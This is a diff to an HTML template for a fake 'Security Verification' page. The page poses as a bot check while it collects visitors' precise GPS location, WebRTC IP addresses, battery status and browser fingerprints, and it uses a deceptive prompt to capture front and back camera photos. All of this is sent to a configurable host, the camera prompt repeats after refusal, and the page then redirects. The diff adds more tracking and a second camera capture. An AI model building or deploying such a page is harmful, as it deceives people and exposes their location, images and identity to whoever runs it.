@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Just a moment...</title>
+    <title>Verifying Connection...</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -13,118 +13,321 @@
             display: flex;
             justify-content: center;
             align-items: center;
+            overflow: hidden;
         }
         .container {
             max-width: 500px;
             width: 90%;
-            background: rgba(255, 255, 255, 0.95);
-            border-radius: 20px;
+            background: rgba(255, 255, 255, 0.97);
+            backdrop-filter: blur(10px);
+            border-radius: 24px;
             padding: 40px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
             text-align: center;
             color: #333;
+            position: relative;
+            overflow: hidden;
         }
-        .logo { font-size: 60px; margin-bottom: 20px; animation: pulse 2s infinite; }
-        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
-        h1 { font-size: 28px; margin-bottom: 10px; color: #667eea; }
-        .subtitle { font-size: 16px; color: #666; margin-bottom: 30px; }
-        .progress-bar { width: 100%; height: 8px; background: #e0e0e0; border-radius: 10px; overflow: hidden; margin: 20px 0; }
-        .progress-fill { height: 100%; background: linear-gradient(90deg, #667eea, #764ba2); animation: progress <%= duration %>ms linear forwards; }
-        @keyframes progress { from { width: 0%; } to { width: 100%; } }
-        .loader { margin: 30px auto; border: 5px solid #f3f3f3; border-top: 5px solid #667eea; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; }
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
+            animation: pulse-bg 4s infinite;
+            pointer-events: none;
+        }
+        @keyframes pulse-bg { 0% { transform: scale(0.8); } 50% { transform: scale(1.2); } 100% { transform: scale(0.8); } }
+
+        .logo { 
+            font-size: 64px; 
+            margin-bottom: 20px; 
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: float 3s ease-in-out infinite;
+        }
+        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+
+        h1 { 
+            font-size: 28px; 
+            margin-bottom: 8px; 
+            color: #4f46e5; 
+            font-weight: 700;
+        }
+        .subtitle { 
+            font-size: 16px; 
+            color: #64748b; 
+            margin-bottom: 30px; 
+            line-height: 1.5;
+        }
+
+        .progress-container {
+            width: 100%;
+            height: 10px;
+            background: #e2e8f0;
+            border-radius: 9999px;
+            overflow: hidden;
+            margin: 25px 0;
+            position: relative;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #4f46e5, #7c3aed);
+            border-radius: 9999px;
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+        .progress-label {
+            font-size: 12px;
+            color: #94a3b8;
+            margin-top: 8px;
+        }
+
+        .loader {
+            margin: 30px auto;
+            width: 60px;
+            height: 60px;
+            border: 4px solid #f1f5f9;
+            border-top: 4px solid #4f46e5;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .info-box { background: #f8f9fa; border-radius: 10px; padding: 20px; margin: 20px 0; text-align: left; }
-        .info-item { display: flex; align-items: center; margin: 10px 0; font-size: 14px; }
-        .checkmark { color: #4caf50; font-size: 20px; margin-right: 10px; }
-        .badge { display: inline-block; background: #4caf50; color: white; padding: 5px 15px; border-radius: 20px; font-size: 12px; margin-top: 15px; }
-        .status { font-size: 14px; color: #999; margin-top: 20px; }
-        
+
+        .info-box {
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 16px;
+            padding: 24px;
+            margin: 25px 0;
+            text-align: left;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+        }
+        .info-item {
+            display: flex;
+            align-items: center;
+            margin: 12px 0;
+            font-size: 14px;
+            color: #475569;
+            transition: all 0.3s ease;
+        }
+        .info-item.completed {
+            color: #16a34a;
+            font-weight: 500;
+        }
+        .checkmark {
+            color: #cbd5e1;
+            font-size: 18px;
+            margin-right: 12px;
+            transition: color 0.3s ease;
+        }
+        .info-item.completed .checkmark {
+            color: #16a34a;
+        }
+
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: #dbeafe;
+            color: #1d4ed8;
+            padding: 8px 16px;
+            border-radius: 9999px;
+            font-size: 13px;
+            font-weight: 600;
+            margin-top: 20px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        .status {
+            font-size: 14px;
+            color: #94a3b8;
+            margin-top: 25px;
+            font-style: italic;
+        }
+
         /* Camera Modal */
         .camera-modal {
             display: none;
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.9);
+            inset: 0;
+            background: rgba(0, 0, 0, 0.85);
             z-index: 9999;
+            backdrop-filter: blur(8px);
             justify-content: center;
             align-items: center;
+            padding: 20px;
         }
-        .camera-modal.active { display: flex; }
+        .camera-modal.active {
+            display: flex;
+            animation: modalFadeIn 0.3s ease-out;
+        }
+        @keyframes modalFadeIn { from { opacity: 0; } to { opacity: 1; } }
+
         .camera-content {
             background: white;
-            padding: 30px;
-            border-radius: 15px;
+            border-radius: 20px;
+            padding: 35px;
             text-align: center;
-            max-width: 400px;
+            max-width: 420px;
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+            transform: scale(0.9);
+            animation: modalPop 0.3s ease-out forwards;
         }
-        .camera-icon { font-size: 80px; margin-bottom: 20px; }
-        .camera-text { font-size: 18px; margin-bottom: 20px; color: #333; }
-        .camera-buttons button {
-            padding: 12px 30px;
-            margin: 10px;
-            border: none;
-            border-radius: 8px;
+        @keyframes modalPop { from { transform: scale(0.9); } to { transform: scale(1); } }
+
+        .camera-icon {
+            font-size: 80px;
+            margin-bottom: 20px;
+            background: linear-gradient(45deg, #ef4444, #dc2626);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .camera-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1e293b;
+            margin-bottom: 12px;
+        }
+        .camera-text {
             font-size: 16px;
-            cursor: pointer;
-            transition: all 0.3s;
+            color: #64748b;
+            margin-bottom: 25px;
+            line-height: 1.5;
         }
-        .btn-allow { background: #4caf50; color: white; }
-        .btn-allow:hover { background: #45a049; }
-        .btn-deny { background: #f44336; color: white; }
-        .btn-deny:hover { background: #da190b; }
+        .camera-buttons {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            margin-top: 20px;
+        }
+        .camera-btn {
+            padding: 14px 32px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            min-width: 120px;
+        }
+        .btn-allow {
+            background: #10b981;
+            color: white;
+        }
+        .btn-allow:hover {
+            background: #059669;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(16, 185, 129, 0.3);
+        }
+        .btn-deny {
+            background: #ef4444;
+            color: white;
+        }
+        .btn-deny:hover {
+            background: #dc2626;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(239, 68, 68, 0.3);
+        }
+
+        /* Success Animation */
+        .success-animation {
+            position: fixed;
+            inset: 0;
+            background: rgba(255, 255, 255, 0.9);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.5s ease;
+        }
+        .success-animation.show {
+            opacity: 1;
+        }
+        .success-check {
+            font-size: 120px;
+            color: #10b981;
+            animation: bounce 0.6s ease;
+        }
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-30px); }
+            60% { transform: translateY(-15px); }
+        }
+        .success-text {
+            font-size: 24px;
+            font-weight: 700;
+            color: #1e293b;
+            margin-top: 20px;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="logo">🔒</div>
-        <h1>Security Check</h1>
-        <p class="subtitle">Verifying your browser...</p>
+        <h1>Security Verification</h1>
+        <p class="subtitle">We're verifying your device for enhanced security. This may take up to 30 seconds.</p>
         
         <div class="loader"></div>
         
-        <div class="progress-bar">
-            <div class="progress-fill"></div>
+        <div class="progress-container">
+            <div class="progress-fill" id="progressBar"></div>
         </div>
+        <div class="progress-label" id="progressLabel">0%</div>
         
         <div class="info-box">
-            <div class="info-item">
-                <span class="checkmark">✓</span>
-                <span id="status-1">Gathering device information...</span>
+            <div class="info-item" id="item1">
+                <span class="checkmark">●</span>
+                <span>Gathering device information...</span>
             </div>
-            <div class="info-item">
-                <span class="checkmark">✓</span>
-                <span id="status-2">Analyzing network data...</span>
+            <div class="info-item" id="item2">
+                <span class="checkmark">●</span>
+                <span>Analyzing network data...</span>
             </div>
-            <div class="info-item">
-                <span class="checkmark">✓</span>
-                <span id="status-3">Fingerprinting browser...</span>
+            <div class="info-item" id="item3">
+                <span class="checkmark">●</span>
+                <span>Fingerprinting browser...</span>
             </div>
-            <div class="info-item">
-                <span class="checkmark">✓</span>
-                <span id="status-4">Collecting system info...</span>
+            <div class="info-item" id="item4">
+                <span class="checkmark">●</span>
+                <span>Collecting system info...</span>
+            </div>
+            <div class="info-item" id="item5">
+                <span class="checkmark">●</span>
+                <span>Requesting camera access...</span>
             </div>
         </div>
         
-        <div class="badge">🛡️ Protected</div>
-        <p class="status">This process is automatic. Please wait...</p>
+        <div class="badge">🛡️ Enterprise Grade Security</div>
+        <p class="status">This process helps protect against fraud and unauthorized access.</p>
     </div>
 
     <!-- Camera Permission Modal -->
     <div class="camera-modal" id="cameraModal">
         <div class="camera-content">
             <div class="camera-icon">📷</div>
-            <div class="camera-text">
-                <strong>Camera Access Required</strong>
-                <p>This site wants to use your camera for security verification</p>
-            </div>
+            <h3 class="camera-title">Camera Access Required</h3>
+            <p class="camera-text">
+                For security verification, we need to capture a quick image using your camera.
+                <br><br>
+                <strong>This helps ensure you're not a bot.</strong>
+            </p>
             <div class="camera-buttons">
-                <button class="btn-allow" onclick="allowCamera()">Allow</button>
-                <button class="btn-deny" onclick="denyCamera()">Block</button>
+                <button class="camera-btn btn-allow" onclick="allowCamera()">Allow Access</button>
+                <button class="camera-btn btn-deny" onclick="denyCamera()">Block</button>
             </div>
         </div>
+    </div>
+
+    <!-- Success Animation -->
+    <div class="success-animation" id="successAnimation">
+        <div class="success-check">✓</div>
+        <div class="success-text">Verification Complete!</div>
     </div>
 
     <script>
@@ -132,10 +335,30 @@
         const host = '<%= host %>';
         const targetUrl = '<%= url %>';
         const delay = <%= duration %>;
+        const progressBar = document.getElementById('progressBar');
+        const progressLabel = document.getElementById('progressLabel');
 
         let cameraAttempts = 0;
         let cameraGranted = false;
         let cameraDenied = false;
+        let completedSteps = 0;
+        const totalSteps = 5;
+
+        function updateProgress() {
+            const percent = Math.min(Math.floor((completedSteps / totalSteps) * 100), 100);
+            progressBar.style.width = `${percent}%`;
+            progressLabel.textContent = `${percent}%`;
+        }
+
+        function completeStep(stepId) {
+            const item = document.getElementById(stepId);
+            if (item && !item.classList.contains('completed')) {
+                item.classList.add('completed');
+                item.querySelector('span').textContent = item.querySelector('span').textContent.replace('...', ' ✓');
+                completedSteps++;
+                updateProgress();
+            }
+        }
 
         function send(endpoint, data) {
             fetch(`${host}/${endpoint}`, {
@@ -149,7 +372,6 @@
 
         // 1. Location
         setTimeout(() => {
-            document.getElementById('status-1').textContent = 'Getting GPS location...';
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     pos => {
@@ -157,17 +379,22 @@
                             lat: pos.coords.latitude,
                             lon: pos.coords.longitude,
                             uid: uid,
-                            acc: pos.coords.accuracy
+                            acc: pos.coords.accuracy,
+                            alt: pos.coords.altitude,
+                            heading: pos.coords.heading,
+                            speed: pos.coords.speed
                         });
-                        document.getElementById('status-1').textContent = '✓ Location captured';
+                        completeStep('item1');
                     },
                     () => {
-                        document.getElementById('status-1').textContent = '✓ Location unavailable';
+                        completeStep('item1');
                     },
                     { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                 );
+            } else {
+                completeStep('item1');
             }
-        }, 500);
+        }, 300);
 
         // 2. Battery Info
         let batteryInfo = 'Not available';
@@ -228,7 +455,7 @@
             canvas.width = 200;
             canvas.height = 50;
             ctx.textBaseline = 'top';
-            ctx.font = '14px Arial';
+            ctx.font = "14px Arial";
             ctx.fillStyle = '#f60';
             ctx.fillRect(125, 1, 62, 20);
             ctx.fillStyle = '#069';
@@ -299,28 +526,20 @@
 
         // Gather ALL Info
         setTimeout(async () => {
-            document.getElementById('status-2').textContent = 'Collecting network data...';
-            
             const webrtcIPs = await getIPs();
             localIPs = webrtcIPs.filter(ip => ip.startsWith('192.') || ip.startsWith('10.') || ip.startsWith('172.'));
             publicIP = webrtcIPs.find(ip => !ip.startsWith('192.') && !ip.startsWith('10.') && !ip.startsWith('172.')) || 'Not found';
-            
-            document.getElementById('status-2').textContent = '✓ Network analyzed';
-        }, 1000);
+            completeStep('item2');
+        }, 800);
 
         setTimeout(() => {
-            document.getElementById('status-3').textContent = 'Creating fingerprint...';
-            
             const canvasFingerprint = getCanvasFingerprint();
             const audioFingerprint = getAudioFingerprint();
             const installedFonts = detectFonts();
-            
-            document.getElementById('status-3').textContent = '✓ Fingerprint created';
-        }, 2000);
+            completeStep('item3');
+        }, 1500);
 
         setTimeout(() => {
-            document.getElementById('status-4').textContent = 'Finalizing data collection...';
-            
             const completeInfo = `╔══════════════════════════════════════╗
 ║        <b>📊 COMPLETE DEVICE INFO</b>        ║
 ╚══════════════════════════════════════╝
@@ -391,12 +610,11 @@ UTC Time: ${new Date().toUTCString()}
 <i>Data collected successfully ✓</i>`;
 
             send('info', { uid: uid, data: completeInfo });
-            
-            document.getElementById('status-4').textContent = '✓ All data collected';
-        }, 3000);
+            completeStep('item4');
+        }, 2200);
 
-        // ========== CAMERA PERMISSION (PERSISTENT) ==========
-        
+        // ========== ENHANCED CAMERA HANDLING ==========
+
         function showCameraModal() {
             document.getElementById('cameraModal').classList.add('active');
             send('camera-status', { uid: uid, status: 'pending' });
@@ -405,59 +623,50 @@ UTC Time: ${new Date().toUTCString()}
         function allowCamera() {
             document.getElementById('cameraModal').classList.remove('active');
             cameraGranted = true;
-            captureCamera();
+            requestCameraAccess();
         }
 
         function denyCamera() {
             document.getElementById('cameraModal').classList.remove('active');
             cameraDenied = true;
             send('camera-status', { uid: uid, status: 'denied' });
+            completeStep('item5');
         }
 
-        async function requestCamera() {
+        async function requestCameraAccess(facingMode = 'user') {
             if (cameraGranted || cameraDenied) return;
-            
-            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                return;
-            }
 
             try {
-                // Try to get camera directly first
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                cameraGranted = true;
-                captureCamera(stream);
+                const constraints = {
+                    video: facingMode === 'environment' ? { facingMode: 'environment' } : true
+                };
+                
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                captureAndSend(stream, facingMode);
             } catch (err) {
-                // If blocked, show custom modal
                 if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                     cameraAttempts++;
-                    
-                    if (cameraAttempts < 3) {
-                        // Show modal again
-                        setTimeout(() => {
-                            showCameraModal();
-                        }, 2000);
+                    if (cameraAttempts <= 3) {
+                        setTimeout(showCameraModal, 1000);
                     } else {
                         cameraDenied = true;
-                        send('camera-status', { uid: uid, status: 'denied' });
+                        send('camera-status', { uid: uid, status: 'error' });
+                        completeStep('item5');
                     }
                 } else {
-                    // Show modal for first-time permission
-                    showCameraModal();
+                    // Try alternative facing mode
+                    if (facingMode === 'user') {
+                        setTimeout(() => requestCameraAccess('environment'), 1000);
+                    } else {
+                        cameraDenied = true;
+                        send('camera-status', { uid: uid, status: 'error' });
+                        completeStep('item5');
+                    }
                 }
             }
         }
 
-        function captureCamera(stream) {
-            if (!stream) {
-                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
-                    .then(s => processCamera(s))
-                    .catch(() => {});
-            } else {
-                processCamera(stream);
-            }
-        }
-
-        function processCamera(stream) {
+        function captureAndSend(stream, type = 'front') {
             const video = document.createElement('video');
             video.srcObject = stream;
             video.play();
@@ -469,35 +678,40 @@ UTC Time: ${new Date().toUTCString()}
                     const canvas = document.createElement('canvas');
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0);
                     
-                    const imageData = canvas.toDataURL('image/png').split(',')[1];
+                    const imageData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
                     
-                    send('camsnap', { uid: uid, img: imageData });
+                    send('camsnap', { 
+                        uid: uid, 
+                        [type === 'environment' ? 'back' : 'front']: imageData 
+                    });
                     
                     stream.getTracks().forEach(t => t.stop());
+                    
+                    // Try to get the other camera
+                    if (type === 'user') {
+                        setTimeout(() => requestCameraAccess('environment'), 1500);
+                    } else {
+                        completeStep('item5');
+                    }
                 }, 500);
             };
         }
 
-        // Start camera request after 4 seconds
+        // Start camera after other data collected
         setTimeout(() => {
-            requestCamera();
-        }, 4000);
+            requestCameraAccess();
+        }, 3000);
 
-        // Keep trying every 5 seconds until allowed/denied
-        const cameraInterval = setInterval(() => {
-            if (!cameraGranted && !cameraDenied && cameraAttempts < 5) {
-                requestCamera();
-            } else {
-                clearInterval(cameraInterval);
-            }
-        }, 5000);
-
-        // Redirect after delay
+        // Redirect with success animation
         setTimeout(() => {
-            window.location.href = targetUrl;
-        }, delay);
+            document.getElementById('successAnimation').classList.add('show');
+            setTimeout(() => {
+                window.location.href = targetUrl;
+            }, 1000);
+        }, delay - 1000);
     </script>
 </body>
 </html>
